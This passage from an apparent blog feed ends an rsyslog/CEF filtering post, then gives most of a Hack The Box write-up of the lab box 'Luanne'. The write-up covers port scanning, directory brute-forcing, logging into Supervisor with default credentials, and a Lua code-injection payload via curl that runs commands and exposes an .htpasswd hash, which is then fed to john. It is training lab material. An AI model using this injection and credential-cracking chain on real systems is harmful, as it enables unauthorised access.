syntax a single at sign (@) means UDP while double at sign (@@) means TCP. :warning: Warning: In the previously mentioned Deep Dive CEF webinar, Ofer also recommend you change the omsagent configuration to accept messages using TCP. If you follow his recommendation, you also need to adjust any forwarding instruction to double at signs in your 95-omsagent.conf file, otherwise the messages won’t be sent to Log Analytics. Filtering out events If you’re still noticing ingestion of unnecessary events into your workspace, you can both implement the filter in the source as well in the forwarder, which is normally easier once most of the appliances don’t support much granularity on their configurations. An uncomplicated way to implement this is creating a file to be processed before the files 60-cef.conf and 95-omsagent.conf, in this example named 59-filter-out.conf but you can use whatever name you want but need to ensure they’ll be processed in the right order. In this file we’ll make use again of the instruction stop, dropping the messages we don’t want to be forwarder either to Syslog or CEF. The sample below drops any message containing “test” and matching one of the severities/facilities will be dropped. if ($rawmsg contains &quot;test&quot;) and prifilt(&quot;auth,authpriv.*&quot;) then { stop } The rsyslog documentation is very rich on resources on how you can filter these messages as well as which properties you have available to build your instructions in a more advanced way, including tips on how to convert the instructions from syslogd syntax to the advanced, previously known as RainerScript Hope that this information helps you to properly deploy and maintain your CEF/Syslog forwarder infrastructure in your environment! Do you have an specific configuration or challenge in your environment not discussed here? Feel free to reach out on the comments so we can update this post in order to help others facing the same! :smile:</summary></entry><entry><title type="html">Hackthebox write-up: Luanne</title><link href="https://davicruz.com/writeup/2021/03/htb-luanne/" rel="alternate" type="text/html" title="Hackthebox write-up: Luanne" /><published>2021-03-27T09:00:00-03:00</published><updated>2021-03-27T09:00:00-03:00</updated><id>https://davicruz.com/writeup/2021/03/htb-luanne</id><content type="html" xml:base="https://davicruz.com/writeup/2021/03/htb-luanne/">&lt;p&gt;Hello everyone!&lt;/p&gt;

&lt;p&gt;The box of this week will be &lt;strong&gt;Luanne&lt;/strong&gt;, another easy-rated Linux box from  &lt;a href=&quot;https://www.hackthebox.eu&quot;&gt;Hack The Box&lt;/a&gt;, created by &lt;a href=&quot;https://app.hackthebox.eu/users/159204&quot;&gt;polarbearer&lt;/a&gt;.&lt;!--more--&gt;&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:information_source: &lt;strong&gt;Info&lt;/strong&gt;: Write-ups for Hack The Box are always posted as soon as machines get retired.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/H8PyuHc.png&quot; alt=&quot;HTB Luanne&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;p&gt;Started enumeration, as usual, by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;quickscan to check published services on this box:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; quick 10.10.10.218
Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;will be slower.
Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-02-19 13:35 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.218
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 997 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NetBSD 20190418-hpn13v14-lpk&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
| 3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| 521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_ 256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open http nginx 1.19.0
| http-auth:
| HTTP/1.1 401 Unauthorized&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0D
|_ Basic &lt;span class=&quot;nv&quot;&gt;realm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
| http-robots.txt: 1 disallowed entry
|_/weather
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized
9001/tcp open http Medusa httpd 1.12 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Supervisor process manager&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| http-auth:
| HTTP/1.1 401 Unauthorized&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0D
|_ Basic &lt;span class=&quot;nv&quot;&gt;realm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;default
|_http-server-header: Medusa/1.12
|_http-title: Error response
Service Info: OS: NetBSD&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:netbsd:netbsd
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;208.02 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;80tcp---http-service&quot;&gt;80/TCP - HTTP Service&lt;/h2&gt;

&lt;p&gt;Acessing the root page of this webservice an authentication was requested, to which we still don’t have any credentials to try. Something that called attention is a link to 3000/TCP on localhost, once we’re acessing this website on 80/TCP, which shows us that this page is being published using some kind of proxy.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/29kTezx.png&quot; alt=&quot;HTB Luanne - 3000/TCP&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Acording to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan, there’s an entry on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt;. Validating its contents, we found some interesting information about a virtual directory called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/weather&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://10.10.10.218/robots.txt
User-agent: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
Disallow: /weather &lt;span class=&quot;c&quot;&gt;#returning 404 but still harvesting cities&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this information we can infer that, even receiving 404 accessing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/weather&lt;/code&gt; there might be another service published inside of it, allowing us to query weather information.&lt;/p&gt;

&lt;h3 id=&quot;gobuster&quot;&gt;Gobuster&lt;/h3&gt;

&lt;p&gt;Executing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; in directory mode, I was able to find the path &lt;strong&gt;forecast&lt;/strong&gt;, which was key to proceed with on this machine.:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.218/weather/ &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; gosbuter-80-weather.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 50
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url: http://10.10.10.218/weather/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads: 50
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes: 200,204,301,302,307,401,403
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent: gobuster/3.0.1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout: 10s
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2021/02/19 14:50:37 Starting gobuster
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
/forecast &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Progress: 68993 / 220561 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;31.28%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In a curl request with no , we receive back some “help” on how to use this API, which allows us to query weather data for specific cities.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://10.10.10.218/weather/forecast
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;code&quot;&lt;/span&gt;: 200, &lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;No city specified. Use 'city=list' to list available cities.&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://10.10.10.218/weather/forecast?city&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;list
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;code&quot;&lt;/span&gt;: 200,&lt;span class=&quot;s2&quot;&gt;&quot;cities&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;London&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Manchester&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Birmingham&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Leeds&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Glasgow&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Southampton&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Liverpool&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Newcastle&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Nottingham&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Sheffield&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Bristol&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Belfast&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Leicester&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]}&lt;/span&gt;
  
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://10.10.10.218/weather/forecast?city&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;London
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;code&quot;&lt;/span&gt;: 200,&lt;span class=&quot;s2&quot;&gt;&quot;city&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;London&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;list&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;date&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2021-02-19&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;weather&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;description&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;snowy&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;temperature&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;min&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;12&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;max&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;46&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;pressure&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;1799&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;humidity&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;92&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;wind&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;speed&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2.1975513692014&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;degree&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;102.76822959445&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}}}&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;date&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2021-02-20&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;weather&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;description&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;partially cloudy&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;temperature&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;min&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;15&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;max&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;43&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;pressure&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;1365&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;humidity&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;51&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;wind&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;speed&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;4.9522297247313&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;degree&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;262.63571172766&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}}}&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;date&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2021-02-21&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;weather&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;description&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;sunny&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;temperature&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;min&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;19&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;max&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;30&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;pressure&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;1243&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;humidity&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;13&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;wind&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;speed&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;1.8041767538525&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;degree&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;48.400944394059&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}}}&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;date&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2021-02-22&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;weather&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;description&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;sunny&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;temperature&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;min&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;30&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;max&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;34&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;pressure&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;1513&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;humidity&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;84&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;wind&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;speed&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2.6126398323104&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;degree&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;191.63755226741&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}}}&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;date&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2021-02-23&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;weather&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;description&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;partially cloudy&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;temperature&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;min&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;30&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;max&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;36&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;pressure&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;1772&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;humidity&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;53&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;wind&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;speed&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2.7699138359167&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;degree&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;104.89152945159&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}}}]}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Besides being possible to query all the information in this API, I couldn’t to identify any detail that could be used to get an RCE and possibly an initial access  in this box.&lt;/p&gt;

&lt;h3 id=&quot;9001tcp---http-service&quot;&gt;9001/TCP - HTTP Service&lt;/h3&gt;

&lt;p&gt;Searching for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Medusa httpd 1.12 (Supervisor process manager)&lt;/code&gt; I have found that this service could be an application called  &lt;a href=&quot;https://github.com/Supervisor/supervisor&quot;&gt;&lt;strong&gt;Supervisor&lt;/strong&gt;&lt;/a&gt;. Searching for its default credentials in the project page, I have found &lt;strong&gt;user:123&lt;/strong&gt;, which allowed me to access the portal as below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/2fSp0Lx.png&quot; alt=&quot;HTB Luanne - Supervisor&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At first sight we can identify the running version, which is &lt;strong&gt;4.2.0&lt;/strong&gt;, and that, unfortunately, has no known vulnerability/working PoC disclosed.&lt;/p&gt;

&lt;p&gt;Exploring all available options, an interesting point was noted: the link &lt;strong&gt;processes&lt;/strong&gt;. Once you access it all the processes in execution will be listed, but one of them have stood over the others:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;_httpd 376 0.0 0.0 34956 2020 ? Is 5:56AM 0:00.13 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As I could understand, the API we were using being published on 80/TCP is an app developed using &lt;a href=&quot;https://www.lua.org/start.html&quot;&gt;LUA&lt;/a&gt;, a programming language developed by PUC-RJ.&lt;/p&gt;

&lt;h2 id=&quot;initial-access&quot;&gt;Initial access&lt;/h2&gt;

&lt;p&gt;Once we’re aware that this API was developed in LUA, after some research I came across &lt;a href=&quot;https://www.syhunt.com/en/index.php?n=Articles.LuaVulnerabilities&quot;&gt;this article&lt;/a&gt;, which describes some ways to abuse applications written in LUA using code injection and, after a few testes, I have found something that could lead us to an initial access on this machine.&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:bulb: &lt;strong&gt;Note&lt;/strong&gt;: The secret is in the content encoding sent on the requests. The easier way I have found was to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--data-urlencode&lt;/code&gt;, simplifying the character escaping on the request.&lt;/p&gt;

&lt;p&gt;The final injection, which later allowed me to get an RCE is listed below:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data-urlencode&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;city=London') os.execute('ls -la') x=('&quot;&lt;/span&gt; http://10.10.10.218/weather/forecast
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;code&quot;&lt;/span&gt;: 500,&lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;unknown city: Londontotal 20
drwxr-xr-x 2 root wheel 512 Nov 25 11:27 .
drwxr-xr-x 24 root wheel 512 Nov 24 09:55 ..
-rw-r--r-- 1 root wheel 47 Sep 16 15:07 .htpasswd
-rw-r--r-- 1 root wheel 386 Sep 17 20:56 index.html
-rw-r--r-- 1 root wheel 78 Nov 25 11:38 robots.txt
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From this execution I was able to read the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.htpasswd&lt;/code&gt;, which contains the password hash for website access and, using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; dictionary, I was able to crack the password.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .htpasswd
webapi_user:&lt;span class=&quot;nv&quot;&gt;$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0&lt;/span&gt;
  
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;md5crypt-long .htpasswd
